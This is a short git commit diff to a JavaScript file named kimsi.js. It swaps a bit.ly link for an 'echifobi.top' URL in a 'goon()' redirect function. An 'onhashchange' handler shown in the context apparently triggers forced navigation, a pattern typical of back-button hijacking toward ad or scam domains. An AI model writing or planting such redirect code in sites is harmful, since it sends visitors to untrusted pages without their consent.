82cc2848a4bf64c5201270d65b330a1ae28384bf
katemj25 <mbokofficial1@gmail.com>
2025-05-01 23:29:55 -0700

    Update kimsi.js

--- kimsi.js
+++ kimsi.js
@@ -10,8 +10,8 @@ window.onhashchange=function(){jp();};
         location.href="https://echifobi.top/4/9089389";
     }
 function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://echifobi.top/4/9089389";
     }
 function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://echifobi.top/4/9089389";
     }
